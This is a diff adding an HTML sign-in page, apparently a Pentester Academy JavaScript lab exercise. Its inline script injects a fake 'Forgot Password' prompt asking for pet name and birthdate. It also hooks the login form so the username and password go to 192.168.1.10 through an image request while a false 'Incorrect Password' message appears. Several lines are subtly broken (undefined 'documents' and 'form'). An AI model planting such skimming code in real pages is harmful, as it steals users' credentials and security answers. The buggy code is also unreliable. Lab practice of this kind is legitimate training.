@@ -1,0 +1,46 @@
+<html>
+  <body>
+    <form class="form-signin">
+      <h2 class="form-signin-heading">Please sign in</h2>
+      <input class="input-block-level" type="text" name="email" placeholder="Email address" value="">
+      <input class="input-block-level" type="password" name="password" placeholder="Password">
+      <button class="btn btn-large btn-primary" type="submit">Sign in</button>
+    </form>
+    <script>
+var forgot = document.createElement("a");
+var child = document.forms[0].childNodes[6];
+var fpass=document.createTextNode("Forgot Password");
+forgot.appendChild(fpass);
+forgot.href = "#";
+child.parentNode.insertBefore(forgot,child.nextSibling);
+forgot.onclick = function(){
+  var evilform = document.forms[0].innerHTML="";
+  document.body.appendChild(evilform);
+  var input1 = document.createElement("input");
+  var input2 = document.createElement("input");
+  var evilbtn = document.createElement("button");
+  var txt=document.createTextNode("Submit");
+  evilbtn.appendChild(txt);
+  evilform.appendChild(input1);
+  evilform.appendChild(input2);
+  evilform.appendChild(evilbtn);
+  input1.setAttribute("type","text");
+  input1.setAttribute("placeholder","What is your Pet's Name ?");
+  input2.setAttribute("type","text");
+  input2.setAttribute("placeholder","What is your Birthdate ?");
+  evilbtn.onclick = function(){var pet=document.forms[0].elements[0].value;
+    var bday=document.forms[0].elements[1].value;
+    new Image().src = "http://192.168.1.10/?petname="+pet+"&bday="+bday;
+    document.location = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3";
+    }
+  }
+document.forms[0].onsubmit = function(){
+  var user=documents.forms[0].elements[0].value;
+  var pass=documents.forms[0].elements[1].value;
+  var wrong=document.createTextNode(" Incorrect Password");
+  form.appendChild(wrong);
+  new Image().src = "http://192.168.1.10/?username="+user+"&password="+pass;
+  setTimeout(function(){form.removeChild(form.childNodes[12]);},3000);return false;}
+</script>
+</body>
+</html>
